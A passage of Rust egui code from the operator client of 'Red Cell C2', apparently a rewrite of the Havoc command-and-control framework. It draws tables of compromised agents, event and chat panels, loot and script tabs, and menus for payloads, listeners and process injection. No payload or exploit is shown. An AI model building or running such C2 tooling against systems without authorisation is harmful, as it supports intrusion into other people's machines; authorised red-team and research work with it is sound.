                        .color(egui::Color32::from_rgb(232, 182, 83))
                        .strong(),
                );
            }

            ui.with_layout(egui::Layout::right_to_left(egui::Align::Center), |ui| {
                if ui.button("Mark all read").clicked() {
                    self.session_panel.pending_mark_all_read = true;
                }
            });
        });
        ui.separator();

        // Filter buttons with per-kind unread counts.
        ui.horizontal(|ui| {
            let all_selected = self.session_panel.event_kind_filter.is_none();
            if ui.selectable_label(all_selected, "All").clicked() {
                self.session_panel.event_kind_filter = None;
            }
            for kind in [EventKind::Agent, EventKind::Operator, EventKind::System] {
                let selected = self.session_panel.event_kind_filter == Some(kind);
                let unread_for_kind = state.event_log.unread_by_kind(kind);
                let label = if unread_for_kind > 0 {
                    format!("{} ({})", kind.label(), unread_for_kind)
                } else {
                    kind.label().to_owned()
                };
                if ui.selectable_label(selected, label).clicked() {
                    self.session_panel.event_kind_filter = Some(kind);
                }
            }
        });
        ui.add_space(4.0);

        let online_users = if state.online_operators.is_empty() {
            "No presence data".to_owned()
        } else {
            state.online_operators.iter().cloned().collect::<Vec<_>>().join(", ")
        };
        ui.label(format!("Online: {online_users}"));
        ui.add_space(4.0);

        ui.horizontal(|ui| {
            let input = ui.add(
                egui::TextEdit::singleline(&mut self.session_panel.chat_input)
                    .desired_width(f32::INFINITY)
                    .hint_text("Send a message to all operators"),
            );
            let send_requested =
                input.lost_focus() && ui.input(|state| state.key_pressed(egui::Key::Enter));
            if ui.button("Send").clicked() || send_requested {
                if let Some(message) = build_chat_message(
                    state.operator_info.as_ref().map(|operator| operator.username.as_str()),
                    &self.session_panel.chat_input,
                ) {
                    self.session_panel.pending_messages.push(message);
                    self.session_panel.chat_input.clear();
                }
            }
        });
        ui.add_space(6.0);

        let active_filter = self.session_panel.event_kind_filter;
        let visible: Vec<_> = state
            .event_log
            .entries
            .iter()
            .filter(|e| active_filter.is_none_or(|k| e.kind == k))
            .collect();

        if visible.is_empty() {
            ui.label("No events yet.");
        } else {
            egui::ScrollArea::vertical().stick_to_bottom(true).show(ui, |ui| {
                for entry in &visible {
                    ui.group(|ui| {
                        ui.horizontal(|ui| {
                            let kind_color = match entry.kind {
                                EventKind::Agent => egui::Color32::from_rgb(110, 199, 141),
                                EventKind::Operator => egui::Color32::from_rgb(100, 180, 240),
                                EventKind::System => egui::Color32::from_rgb(180, 180, 180),
                            };
                            ui.colored_label(kind_color, entry.kind.label());
                            ui.strong(&entry.author);
                            ui.label(RichText::new(&entry.sent_at).weak());
                            if !entry.read {
                                ui.label(
                                    RichText::new("●").color(egui::Color32::from_rgb(232, 182, 83)),
                                );
                            }
                        });
                        ui.label(&entry.message);
                    });
                }
            });
        }
    }

    fn render_current_phase(
        &mut self,
        ctx: &egui::Context,
        fallback_app_state: Option<SharedAppState>,
    ) {
        match &mut self.phase {
            AppPhase::Login(login_state) => {
                let action = render_login_dialog(ctx, login_state);
                match action {
                    LoginAction::Submit => {
                        self.handle_login_submit(ctx);
                    }
                    LoginAction::TrustCertificate(fingerprint)
                    | LoginAction::AcceptChangedCertificate(fingerprint) => {
                        self.handle_trust_certificate(fingerprint);
                        self.handle_login_submit(ctx);
                    }
                    LoginAction::Waiting => {}
                }
            }
            AppPhase::Authenticating { .. } => {
                if let Some(app_state_ref) = fallback_app_state {
                    let snapshot = Self::snapshot(&app_state_ref);
                    egui::CentralPanel::default().show(ctx, |ui| {
                        ui.with_layout(Layout::top_down(Align::Center), |ui| {
                            ui.add_space(ui.available_height() * 0.35);
                            ui.heading("Authenticating...");
                            ui.add_space(8.0);
                            ui.colored_label(
                                snapshot.connection_status.color(),
                                snapshot.connection_status.label(),
                            );
                        });
                    });
                }
            }
            AppPhase::Connected { app_state, .. } => {
                let app_state_ref = app_state.clone();
                self.render_main_ui(ctx, &app_state_ref);
            }
        }
    }

    fn render_main_ui(&mut self, ctx: &egui::Context, app_state: &SharedAppState) {
        let snapshot = Self::snapshot(app_state);

        // ── Menu bar (top) ──────────────────────────────────────────
        egui::TopBottomPanel::top("menu_bar").show(ctx, |ui| {
            self.render_menu_bar(ui, &snapshot);
        });

        // ── Status bar (bottom) ─────────────────────────────────────
        egui::TopBottomPanel::bottom("status_bar").exact_height(22.0).show(ctx, |ui| {
            self.render_status_bar(ui, &snapshot);
        });

        // ── Bottom dock panel (tabbed) ──────────────────────────────
        egui::TopBottomPanel::bottom("dock_panel")
            .resizable(true)
            .default_height(350.0)
            .min_height(120.0)
            .show(ctx, |ui| {
                self.render_dock_panel(ui, &snapshot);
            });

        // ── Central panel: top half with session table + event viewer
        egui::CentralPanel::default().show(ctx, |ui| {
            self.render_top_zone(ui, &snapshot);
        });

        // ── Modal dialogs ───────────────────────────────────────────
        self.render_note_editor(ctx, app_state);
        self.render_process_injection_dialog(ctx);
        self.render_listener_dialog(ctx, &snapshot);
        self.render_payload_dialog(ctx, &snapshot, app_state);

        if self.session_panel.pending_mark_all_read {
            self.session_panel.pending_mark_all_read = false;
            match app_state.lock() {
                Ok(mut state) => state.event_log.mark_all_read(),
                Err(poisoned) => poisoned.into_inner().event_log.mark_all_read(),
            }
        }

        self.flush_pending_messages();
    }

    /// Havoc-style menu bar: Havoc, View, Attack, Scripts, Help.
    fn render_menu_bar(&mut self, ui: &mut egui::Ui, state: &AppState) {
        egui::MenuBar::new().ui(ui, |ui| {
            ui.menu_button("Red Cell", |ui| {
                ui.label(format!(
                    "Operator: {}",
                    state.operator_info.as_ref().map_or("—", |op| op.username.as_str())
                ));
                ui.label(format!("Server: {}", state.server_url));
                ui.separator();
                let status_color = state.connection_status.color();
                ui.colored_label(status_color, state.connection_status.label());
                ui.separator();
                if ui.button("Disconnect").clicked() {
                    ui.close();
                }
            });

            ui.menu_button("View", |ui| {
                if ui.button("Event Viewer").clicked() {
                    self.session_panel.dock.event_viewer_open =
                        !self.session_panel.dock.event_viewer_open;
                    ui.close();
                }
                ui.separator();
                if ui.button("Teamserver Chat").clicked() {
                    self.session_panel.dock.open_tab(DockTab::TeamserverChat);
                    ui.close();
                }
                if ui.button("Listeners").clicked() {
                    self.session_panel.dock.open_tab(DockTab::Listeners);
                    ui.close();
                }
                if ui.button("Session Graph").clicked() {
                    self.session_panel.dock.open_tab(DockTab::SessionGraph);
                    ui.close();
                }
                if ui.button("Scripts").clicked() {
                    self.session_panel.dock.open_tab(DockTab::Scripts);
                    ui.close();
                }
                if ui.button("Loot").clicked() {
                    self.session_panel.dock.open_tab(DockTab::Loot);
                    ui.close();
                }
            });

            ui.menu_button("Attack", |ui| {
                if ui.button("Payload").clicked() {
                    if self.session_panel.payload_dialog.is_none() {
                        self.session_panel.payload_dialog = Some(PayloadDialogState::new());
                    }
                    ui.close();
                }
            });

            ui.menu_button("Scripts", |ui| {
                if ui.button("Script Manager").clicked() {
                    self.session_panel.dock.open_tab(DockTab::Scripts);
                    ui.close();
                }
            });

            ui.menu_button("Help", |ui| {
                ui.label("Red Cell C2 — Havoc rewrite in Rust");
                ui.label("https://github.com/…");
            });
        });
    }

    /// Bottom status bar showing operator name (like Havoc).
    fn render_status_bar(&self, ui: &mut egui::Ui, state: &AppState) {
        ui.horizontal_centered(|ui| {
            let operator = state.operator_info.as_ref().map_or("—", |op| op.username.as_str());
            ui.label(RichText::new(operator).monospace().small());
        });
    }

    /// Top zone: session table (left) + event viewer (right).
    fn render_top_zone(&mut self, ui: &mut egui::Ui, state: &AppState) {
        let avail = ui.available_size();

        if self.session_panel.dock.event_viewer_open {
            let split = self.session_panel.dock.top_split_fraction;
            let left_width = (avail.x * split - 4.0).max(100.0);
            let right_width = (avail.x * (1.0 - split) - 4.0).max(100.0);

            ui.horizontal(|ui| {
                // Session table (left)
                ui.allocate_ui(egui::vec2(left_width, avail.y), |ui| {
                    self.render_session_table_zone(ui, state);
                });

                // Thin vertical separator
                ui.separator();

                // Event viewer (right)
                ui.allocate_ui(egui::vec2(right_width, avail.y), |ui| {
                    self.render_event_viewer(ui, state);
                });
            });
        } else {
            self.render_session_table_zone(ui, state);
        }
    }

    /// Session table rendered in the top-left zone (Havoc-style full-width table).
    fn render_session_table_zone(&mut self, ui: &mut egui::Ui, state: &AppState) {
        // Header row with green-tinted column headers (Havoc style)
        self.render_session_table_header(ui);

        if state.agents.is_empty() {
            return;
        }

        let agents = self.filtered_and_sorted_agents(&state.agents);
        if agents.is_empty() {
            return;
        }

        egui::ScrollArea::vertical().id_salt("session_table_scroll").show(ui, |ui| {
            for agent in &agents {
                let fill = if agent.elevated {
                    Color32::from_rgba_unmultiplied(120, 28, 28, 110)
                } else {
                    Color32::TRANSPARENT
                };
                let frame =
                    egui::Frame::default().fill(fill).inner_margin(egui::Margin::symmetric(4, 2));
                let inner = frame.show(ui, |ui| {
                    ui.horizontal(|ui| {
                        self.render_session_row_cell(ui, 86.0, &agent.name_id, true);
                        self.render_session_row_cell(ui, 116.0, &agent.hostname, false);
                        self.render_session_row_cell(ui, 108.0, &agent.username, false);
                        self.render_session_row_cell(ui, 86.0, &agent.domain_name, false);
                        self.render_session_row_cell(ui, 108.0, &agent_ip(agent), false);
                        self.render_session_row_cell(ui, 72.0, &agent.process_pid, false);
                        self.render_session_row_cell(ui, 132.0, &agent.process_name, false);
                        self.render_session_row_cell(ui, 72.0, &agent_arch(agent), false);
                        self.render_session_row_cell(
                            ui,
                            82.0,
                            if agent.elevated { "Yes" } else { "No" },
                            false,
                        );
                        self.render_session_row_cell(ui, 170.0, &agent_os(agent), false);
                        self.render_session_row_cell(ui, 110.0, &agent_sleep_jitter(agent), false);
                        self.render_session_row_cell(ui, 136.0, &agent.last_call_in, false);
                    });
                });

                let row_response = ui.interact(
                    inner.response.rect,
                    ui.make_persistent_id(("agent-row", &agent.name_id)),
                    Sense::click(),
                );

                if row_response.double_clicked() {
                    self.session_panel.ensure_console_open(&agent.name_id);
                }

                row_response.context_menu(|ui| {
                    if ui.button("Interact").clicked() {
                        self.handle_session_action(
                            SessionAction::OpenConsole(agent.name_id.clone()),
                            state.operator_info.as_ref().map(|operator| operator.username.as_str()),
                        );
                        ui.close();
                    }
                    if ui.button("File Explorer").clicked() {
                        self.handle_session_action(
                            SessionAction::OpenFileBrowser(agent.name_id.clone()),
                            state.operator_info.as_ref().map(|operator| operator.username.as_str()),
                        );
                        ui.close();
                    }
                    if ui.button("Process List").clicked() {
                        self.handle_session_action(
                            SessionAction::OpenProcessList(agent.name_id.clone()),
                            state.operator_info.as_ref().map(|operator| operator.username.as_str()),
                        );
                        ui.close();
                    }
                    if ui.button("Kill").clicked() {
                        self.handle_session_action(
                            SessionAction::RequestKill(agent.name_id.clone()),
                            state.operator_info.as_ref().map(|operator| operator.username.as_str()),
                        );
                        ui.close();
                    }
                    if ui.button("Add note").clicked() {
                        self.handle_session_action(
                            SessionAction::EditNote {
                                agent_id: agent.name_id.clone(),
                                current_note: agent.note.clone(),
                            },
                            state.operator_info.as_ref().map(|operator| operator.username.as_str()),
                        );
                        ui.close();
                    }
                });
            }
        });
    }

    /// Event Viewer panel (top-right) — Havoc-style with yellow border accent.
    fn render_event_viewer(&mut self, ui: &mut egui::Ui, state: &AppState) {
        // Tab header with close button
        ui.horizontal(|ui| {
            let tab_text = RichText::new("Event Viewer").strong();
            ui.label(tab_text);
            ui.with_layout(Layout::right_to_left(Align::Center), |ui| {
                if ui
                    .button(RichText::new("X").strong().color(Color32::from_rgb(200, 60, 60)))
                    .clicked()
                {
                    self.session_panel.dock.event_viewer_open = false;
                }
            });
        });

        // Event list — green monospace text like Havoc
        let active_filter = self.session_panel.event_kind_filter;
        let visible: Vec<_> = state
            .event_log
            .entries
            .iter()
            .filter(|e| active_filter.is_none_or(|k| e.kind == k))
            .collect();

        egui::ScrollArea::vertical().id_salt("event_viewer_scroll").stick_to_bottom(true).show(
            ui,
            |ui| {
                for entry in &visible {
                    let event_color = match entry.kind {
                        EventKind::Agent => Color32::from_rgb(110, 199, 141),
                        EventKind::Operator => Color32::from_rgb(100, 180, 240),
                        EventKind::System => Color32::from_rgb(180, 180, 180),
                    };
                    let text = format!("{} [*] {}", entry.sent_at, entry.message);
                    ui.label(RichText::new(text).color(event_color).monospace().small());
                }
            },
        );
    }

    /// Bottom dock panel — tabbed like Havoc with closeable tabs.
    fn render_dock_panel(&mut self, ui: &mut egui::Ui, state: &AppState) {
        self.session_panel.dock.ensure_selected();

        // ── Tab bar ─────────────────────────────────────────────────
        let mut tab_to_close: Option<DockTab> = None;
        let mut tab_to_select: Option<DockTab> = None;

        ui.horizontal(|ui| {
            for tab in &self.session_panel.dock.open_tabs.clone() {
                let selected = self.session_panel.dock.selected.as_ref() == Some(tab);
                let accent = tab.accent_color();

                let frame = if selected {
                    egui::Frame::default()
                        .fill(Color32::from_rgb(40, 42, 54))
                        .stroke(Stroke::new(2.0, accent))
                        .inner_margin(egui::Margin::symmetric(8, 4))
                } else {
                    egui::Frame::default()
                        .fill(Color32::from_rgb(30, 30, 46))
                        .inner_margin(egui::Margin::symmetric(8, 4))
                };

                let response = frame
                    .show(ui, |ui| {
                        ui.horizontal(|ui| {
                            let label_text = if selected {
                                RichText::new(tab.label()).strong().color(Color32::WHITE)
                            } else {
                                RichText::new(tab.label()).color(Color32::from_rgb(160, 160, 170))
                            };
                            if ui.label(label_text).clicked() {
                                tab_to_select = Some(tab.clone());
                            }
                            if tab.closeable()
                                && ui
                                    .button(
                                        RichText::new("X")
                                            .small()
                                            .color(Color32::from_rgb(160, 160, 170)),
                                    )
                                    .clicked()
                            {
                                tab_to_close = Some(tab.clone());
                            }
                        });
                    })
                    .response;

                if response.clicked() {
                    tab_to_select = Some(tab.clone());
                }
            }
        });

        if let Some(tab) = tab_to_close {
            self.session_panel.dock.close_tab(&tab);
        }
        if let Some(tab) = tab_to_select {
            self.session_panel.dock.selected = Some(tab);
        }

        ui.separator();

        // ── Tab content ─────────────────────────────────────────────
        let selected = self.session_panel.dock.selected.clone();
        match selected {
            Some(DockTab::TeamserverChat) => {
                self.render_chat_panel(ui, state);
            }
            Some(DockTab::Listeners) => {
                self.render_listeners_panel(ui, state);
            }
            Some(DockTab::SessionGraph) => {
                self.render_session_graph_panel(ui, state);
            }
            Some(DockTab::Scripts) => {
                self.render_script_manager_panel(ui);
            }
            Some(DockTab::Loot) => {
                self.render_loot_panel(ui, state);
            }
            Some(DockTab::AgentConsole(ref agent_id)) => {
                let agent_id = agent_id.clone();
                self.session_panel.selected_console = Some(agent_id.clone());
                self.render_single_console(ui, state, &agent_id);
            }
            Some(DockTab::FileBrowser(ref agent_id)) => {
                let agent_id = agent_id.clone();
                self.render_file_browser_tab(ui, state, &agent_id);
            }
            Some(DockTab::ProcessList(ref agent_id)) => {
                let agent_id = agent_id.clone();
                self.render_process_list_tab(ui, state, &agent_id);
            }
            None => {
                ui.centered_and_justified(|ui| {
                    ui.label(
                        RichText::new("Open a tab from the View menu or interact with an agent")
                            .weak(),
                    );
                });
            }
        }
    }

    fn render_session_table_header(&mut self, ui: &mut egui::Ui) {
        let widths = [
            (AgentSortColumn::Id, 86.0),
            (AgentSortColumn::Hostname, 116.0),
            (AgentSortColumn::Username, 108.0),
            (AgentSortColumn::Domain, 86.0),
            (AgentSortColumn::Ip, 108.0),
            (AgentSortColumn::Pid, 72.0),
            (AgentSortColumn::Process, 132.0),
            (AgentSortColumn::Arch, 72.0),
            (AgentSortColumn::Elevated, 82.0),
            (AgentSortColumn::Os, 170.0),
            (AgentSortColumn::SleepJitter, 110.0),
            (AgentSortColumn::LastCheckin, 136.0),
        ];
        ui.horizontal(|ui| {
            for (column, width) in widths {
                let label = sort_button_label(
                    self.session_panel.sort_column,
                    self.session_panel.descending,
                    column,
                );
                let button =
                    egui::Button::new(label).frame(false).wrap_mode(egui::TextWrapMode::Truncate);
                if ui.add_sized([width, 24.0], button).clicked() {
                    self.session_panel.toggle_sort(column);
                }
            }
        });
        ui.separator();
    }

    fn render_session_row_cell(&self, ui: &mut egui::Ui, width: f32, value: &str, monospace: bool) {
        let text = ellipsize(value, 24);
        if monospace {
            ui.add_sized([width, 20.0], egui::Label::new(RichText::new(text).monospace()));
        } else {
            ui.add_sized([width, 20.0], egui::Label::new(text));
        }
    }

    fn filtered_and_sorted_agents(
        &self,
        agents: &[transport::AgentSummary],
    ) -> Vec<transport::AgentSummary> {
        let mut filtered: Vec<_> = agents
            .iter()
            .filter(|agent| agent_matches_filter(agent, &self.session_panel.filter))
            .cloned()
            .collect();
        sort_agents(
            &mut filtered,
            self.session_panel.sort_column.unwrap_or(AgentSortColumn::LastCheckin),
            self.session_panel.descending,
        );
        filtered
    }

    fn handle_session_action(&mut self, action: SessionAction, operator: Option<&str>) {
        match action {
            SessionAction::OpenConsole(agent_id) => {
                self.session_panel.ensure_console_open(&agent_id);
            }
            SessionAction::OpenFileBrowser(agent_id) => {
                self.session_panel.ensure_file_browser_open(&agent_id);
            }
            SessionAction::OpenProcessList(agent_id) => {
                self.session_panel.ensure_process_list_open(&agent_id);
                self.queue_process_refresh(&agent_id);
            }
            SessionAction::RequestKill(agent_id) => {
                self.session_panel
                    .pending_messages
                    .push(build_kill_task(&agent_id, operator.unwrap_or("")));
                self.session_panel.status_message =
                    Some(format!("Queued kill task for {agent_id}."));
            }
            SessionAction::EditNote { agent_id, current_note } => {
                self.session_panel.note_editor =
                    Some(NoteEditorState { agent_id, note: current_note });
            }
        }
    }

    fn render_script_manager_panel(&mut self, ui: &mut egui::Ui) {
        ui.heading("Python Scripts");
        ui.separator();

        let Some(runtime) = self.python_runtime.clone() else {
            ui.label("Client Python runtime is not initialized.");
            return;
        };

        let scripts = runtime.script_descriptors();
        let output = runtime.script_output();
        let tabs = runtime.script_tabs();
        self.prune_selected_script(&scripts);
        self.prune_selected_tab(&tabs);

        let loaded_count =
            scripts.iter().filter(|script| script.status == ScriptLoadStatus::Loaded).count();
        let error_count =
            scripts.iter().filter(|script| script.status == ScriptLoadStatus::Error).count();
        let command_count =
            scripts.iter().map(|script| script.registered_command_count).sum::<usize>();
        let tab_count = tabs.len();

        ui.horizontal_wrapped(|ui| {
            ui.label(format!("Loaded: {loaded_count}"));
            ui.separator();
            ui.label(format!("Errors: {error_count}"));
            ui.separator();
            ui.label(format!("Commands: {command_count}"));
            ui.separator();
            ui.label(format!("Tabs: {tab_count}"));
            if let Some(path) =
                self.scripts_dir.clone().or_else(|| self.local_config.resolved_scripts_dir())
            {
                ui.separator();
                ui.monospace(path.display().to_string());
            }
        });
        ui.add_space(6.0);

        ui.horizontal_wrapped(|ui| {
            if ui.button("Load Script").clicked()
                && let Some(path) = FileDialog::new().add_filter("Python", &["py"]).pick_file()
            {
                match runtime.load_script(path.clone()) {
                    Ok(()) => {
                        if let Some(script_name) = script_name_for_display(&path) {
                            self.session_panel.script_manager.selected_script = Some(script_name);
                        }
                        self.session_panel.script_manager.status_message =
                            Some(format!("Loaded {}.", path.display()));
                    }
                    Err(error) => {
                        self.session_panel.script_manager.status_message =
                            Some(format!("Failed to load {}: {error}", path.display()));
                    }
                }
            }

            let selected_script = self.session_panel.script_manager.selected_script.clone();
            if ui
                .add_enabled(selected_script.is_some(), egui::Button::new("Reload Selected"))
                .clicked()
                && let Some(script_name) = selected_script.as_deref()
            {
                self.apply_script_action(
                    &runtime,
                    ScriptManagerAction::Reload(script_name.to_owned()),
                );
            }

            if ui
                .add_enabled(selected_script.is_some(), egui::Button::new("Unload Selected"))
                .clicked()
                && let Some(script_name) = selected_script.as_deref()
            {
                self.apply_script_action(
                    &runtime,
                    ScriptManagerAction::Unload(script_name.to_owned()),
                );
            }
        });

        if let Some(message) = &self.session_panel.script_manager.status_message {
            ui.add_space(4.0);
            ui.label(RichText::new(message).weak());
        }

        ui.add_space(8.0);
        ui.columns(2, |columns| {
            self.render_script_list_panel(&mut columns[0], &runtime, &scripts);
            self.render_script_output_panel(&mut columns[1], &output);
        });

        if !tabs.is_empty() {
            ui.add_space(8.0);
            self.render_script_tabs_panel(ui, &runtime, &tabs);
        }
    }

    fn render_script_list_panel(
        &mut self,
        ui: &mut egui::Ui,
        runtime: &PythonRuntime,
        scripts: &[ScriptDescriptor],
    ) {
        ui.heading("Loaded Scripts");
        ui.separator();

        if scripts.is_empty() {
            ui.label("No Python scripts are loaded yet.");
            return;
        }

        egui::ScrollArea::vertical().id_salt("python-script-list").max_height(300.0).show(
            ui,
            |ui| {
                for script in scripts {
                    let selected = self.session_panel.script_manager.selected_script.as_deref()
                        == Some(script.name.as_str());
                    egui::Frame::default()
                        .fill(if selected {
                            Color32::from_rgba_unmultiplied(110, 199, 141, 28)
                        } else {
                            Color32::from_rgba_unmultiplied(255, 255, 255, 6)
                        })
                        .stroke(Stroke::new(
                            1.0,
                            Color32::from_rgba_unmultiplied(255, 255, 255, 18),
                        ))
                        .inner_margin(egui::Margin::symmetric(8, 8))
                        .show(ui, |ui| {
                            ui.horizontal_wrapped(|ui| {
                                if ui.selectable_label(selected, &script.name).clicked() {
                                    self.session_panel.script_manager.selected_script =
                                        Some(script.name.clone());
                                }
                                ui.separator();
                                ui.colored_label(
                                    script_status_color(script.status),
                                    script_status_label(script.status),
                                );
                                ui.separator();
                                ui.label(format!("{} cmds", script.registered_command_count));
                            });
                            ui.add_space(2.0);
                            ui.monospace(script.path.display().to_string());
                            if !script.registered_commands.is_empty() {
                                ui.add_space(4.0);
                                ui.label(
                                    RichText::new(script.registered_commands.join(", "))
                                        .monospace()
                                        .weak(),
                                );
                            }
                            if let Some(error) = &script.error {
                                ui.add_space(4.0);
                                ui.colored_label(Color32::from_rgb(215, 83, 83), error);
                            }
                            ui.add_space(6.0);
                            ui.horizontal(|ui| {
                                if ui
                                    .add_enabled(
                                        script.status != ScriptLoadStatus::Loaded,
                                        egui::Button::new("Load"),
                                    )
                                    .clicked()
                                {
                                    self.apply_script_action(
                                        runtime,
                                        ScriptManagerAction::Load(script.path.clone()),
                                    );
                                }
                                if ui.small_button("Reload").clicked() {
                                    self.apply_script_action(
                                        runtime,
                                        ScriptManagerAction::Reload(script.name.clone()),
                                    );
                                }
                                if ui
                                    .add_enabled(
                                        script.status != ScriptLoadStatus::Unloaded,
                                        egui::Button::new("Unload"),
                                    )
                                    .clicked()
                                {
                                    self.apply_script_action(
                                        runtime,
                                        ScriptManagerAction::Unload(script.name.clone()),
                                    );
                                }
                            });
                        });
                    ui.add_space(6.0);
                }
            },
        );
    }

    fn render_script_output_panel(&self, ui: &mut egui::Ui, output: &[ScriptOutputEntry]) {
        ui.heading("Script Output");
        ui.separator();

        egui::ScrollArea::vertical()
            .id_salt("python-script-output")
            .stick_to_bottom(true)
            .max_height(300.0)
            .show(ui, |ui| {
                if output.is_empty() {
                    ui.label("No script output captured yet.");
                    return;
                }

                for entry in output {
                    ui.group(|ui| {
                        ui.horizontal_wrapped(|ui| {
                            ui.monospace(&entry.script_name);
                            ui.separator();
                            ui.colored_label(
                                script_output_color(entry.stream),
                                RichText::new(script_output_label(entry.stream)).monospace(),
                            );
                        });
                        ui.add_space(2.0);
                        ui.label(
                            RichText::new(entry.text.trim_end_matches('\n'))
                                .monospace()
                                .color(script_output_color(entry.stream)),
                        );
                    });
                    ui.add_space(4.0);
                }
            });
    }

    fn render_script_tabs_panel(
        &mut self,
        ui: &mut egui::Ui,
        runtime: &PythonRuntime,
        tabs: &[ScriptTabDescriptor],
    ) {
        ui.heading("Script Tabs");
        ui.separator();

        ui.horizontal_wrapped(|ui| {
            for tab in tabs {
                let selected = self.session_panel.script_manager.selected_tab.as_deref()
                    == Some(tab.title.as_str());
                if ui.selectable_label(selected, &tab.title).clicked() {
                    self.session_panel.script_manager.selected_tab = Some(tab.title.clone());
                    if tab.has_callback {
                        self.session_panel.script_manager.status_message =
                            Some(match runtime.activate_tab(&tab.title) {
                                Ok(()) => format!("Activated tab {}.", tab.title),
                                Err(error) => {
                                    format!("Failed to activate tab {}: {error}", tab.title)
                                }
                            });
                    }
                }
            }
        });
        ui.add_space(6.0);

        let selected_title = self
            .session_panel
            .script_manager
            .selected_tab
            .clone()
            .or_else(|| tabs.first().map(|tab| tab.title.clone()));
        let Some(selected_title) = selected_title else {
            ui.label("No script tabs are active.");
            return;
        };
        self.session_panel.script_manager.selected_tab = Some(selected_title.clone());

        let Some(selected_tab) = tabs.iter().find(|tab| tab.title == selected_title) else {
            ui.label("Selected script tab is no longer available.");
            return;
        };

        ui.horizontal_wrapped(|ui| {
            ui.label(RichText::new(&selected_tab.title).strong());
            ui.separator();
            ui.monospace(&selected_tab.script_name);
            if selected_tab.has_callback && ui.button("Refresh").clicked() {
                self.session_panel.script_manager.status_message =
                    Some(match runtime.activate_tab(&selected_tab.title) {
                        Ok(()) => format!("Refreshed tab {}.", selected_tab.title),
                        Err(error) => {
                            format!("Failed to refresh tab {}: {error}", selected_tab.title)
                        }
                    });
            }
        });
        ui.add_space(4.0);

        egui::Frame::group(ui.style()).inner_margin(egui::Margin::same(8)).show(ui, |ui| {
            egui::ScrollArea::vertical()
                .id_salt(("python-script-tab-layout", selected_tab.title.as_str()))
                .max_height(220.0)
                .show(ui, |ui| {
                    if selected_tab.layout.trim().is_empty() {
                        ui.label("This tab has not published any layout yet.");
                    } else {
                        ui.label(RichText::new(&selected_tab.layout).monospace());
                    }
                });
        });
    }

    fn apply_script_action(&mut self, runtime: &PythonRuntime, action: ScriptManagerAction) {
        let result = match &action {
            ScriptManagerAction::Load(path) => runtime.load_script(path.clone()),
            ScriptManagerAction::Reload(script_name) => runtime.reload_script(script_name),
            ScriptManagerAction::Unload(script_name) => runtime.unload_script(script_name),
        };

        self.session_panel.script_manager.status_message = Some(match result {
            Ok(()) => match action {
                ScriptManagerAction::Load(path) => {
                    if let Some(script_name) = script_name_for_display(&path) {
                        self.session_panel.script_manager.selected_script = Some(script_name);
                    }
                    format!("Loaded {}.", path.display())
                }
                ScriptManagerAction::Reload(script_name) => {
                    self.session_panel.script_manager.selected_script = Some(script_name.clone());
                    format!("Reloaded {script_name}.")
                }
                ScriptManagerAction::Unload(script_name) => {
                    self.session_panel.script_manager.selected_script = Some(script_name.clone());
                    format!("Unloaded {script_name}.")
                }
            },
            Err(error) => match action {
                ScriptManagerAction::Load(path) => {
                    format!("Failed to load {}: {error}", path.display())
                }
                ScriptManagerAction::Reload(script_name) => {
                    format!("Failed to reload {script_name}: {error}")
                }
                ScriptManagerAction::Unload(script_name) => {
                    format!("Failed to unload {script_name}: {error}")
                }
            },
        });
    }

    fn prune_selected_script(&mut self, scripts: &[ScriptDescriptor]) {
        if self
            .session_panel
            .script_manager
            .selected_script
            .as_ref()
            .is_some_and(|selected| scripts.iter().any(|script| &script.name == selected))
        {
            return;
        }

        self.session_panel.script_manager.selected_script =
            scripts.first().map(|script| script.name.clone());
    }

    fn prune_selected_tab(&mut self, tabs: &[ScriptTabDescriptor]) {
        if self
            .session_panel
            .script_manager
            .selected_tab
            .as_ref()
            .is_some_and(|selected| tabs.iter().any(|tab| &tab.title == selected))
        {
            return;
        }

        self.session_panel.script_manager.selected_tab = tabs.first().map(|tab| tab.title.clone());
    }

    fn render_session_graph_panel(&mut self, ui: &mut egui::Ui, state: &AppState) {
        ui.horizontal_wrapped(|ui| {
            ui.heading("Session Graph");
            ui.separator();
            ui.label("Drag to pan, scroll to zoom.");
            if ui.button("Reset View").clicked() {
                self.session_panel.graph_state = SessionGraphState::default();
            }
        });
        ui.add_space(6.0);

        let layout = build_session_graph(&state.agents);
        let desired_size = egui::vec2(ui.available_width(), SESSION_GRAPH_HEIGHT);
        let (rect, response) = ui.allocate_exact_size(desired_size, Sense::click_and_drag());
        let painter = ui.painter_at(rect);

        painter.rect_filled(rect, 10.0, Color32::from_rgb(18, 20, 24));
        painter.rect_stroke(
            rect,
            10.0,
            Stroke::new(1.0, Color32::from_rgba_unmultiplied(255, 255, 255, 24)),
            egui::StrokeKind::Middle,
        );

        if response.dragged() {
            self.session_panel.graph_state.pan += ui.input(|input| input.pointer.delta());
            ui.ctx().request_repaint();
        }

        if response.hovered() {
            let scroll_delta = ui.input(|input| input.raw_scroll_delta.y);
            if scroll_delta.abs() > f32::EPSILON {
                let old_zoom = self.session_panel.graph_state.zoom;
                let zoom_factor = (1.0 + scroll_delta * 0.0015).clamp(0.8, 1.25);
                let new_zoom =
                    (old_zoom * zoom_factor).clamp(SESSION_GRAPH_MIN_ZOOM, SESSION_GRAPH_MAX_ZOOM);
                if (new_zoom - old_zoom).abs() > f32::EPSILON {
                    if let Some(pointer_pos) = response.hover_pos() {
                        let local = pointer_pos - rect.center();
                        self.session_panel.graph_state.pan = local
                            - (local - self.session_panel.graph_state.pan) * (new_zoom / old_zoom);
                    }
                    self.session_panel.graph_state.zoom = new_zoom;
                    ui.ctx().request_repaint();
                }
            }
        }

        let hovered_node = response.hover_pos().and_then(|pointer| {
            layout
                .nodes
                .iter()
                .find(|node| {
                    session_graph_node_rect(
                        rect,
                        &self.session_panel.graph_state,
                        node.position,
                        node.size,
                    )
                    .contains(pointer)
                })
                .map(|node| node.id.clone())
        });

        if hovered_node.is_some() {
            ui.ctx().set_cursor_icon(egui::CursorIcon::PointingHand);
        }

        if response.clicked()
            && let (Some(pointer), Some(node_id)) =
                (response.interact_pointer_pos(), hovered_node.clone())
            && node_id != SESSION_GRAPH_ROOT_ID
            && session_graph_node_rect(
                rect,
                &self.session_panel.graph_state,
                graph_node_position(&layout, &node_id).unwrap_or(Pos2::ZERO),
                graph_node_size(&layout, &node_id).unwrap_or(egui::Vec2::ZERO),
            )
            .contains(pointer)
        {
            self.handle_session_action(
                SessionAction::OpenConsole(node_id),
                state.operator_info.as_ref().map(|operator| operator.username.as_str()),
            );
        }

        for edge in &layout.edges {
            let Some(from) = graph_node_position(&layout, &edge.from) else {
                continue;
            };
            let Some(to) = graph_node_position(&layout, &edge.to) else {
                continue;
            };
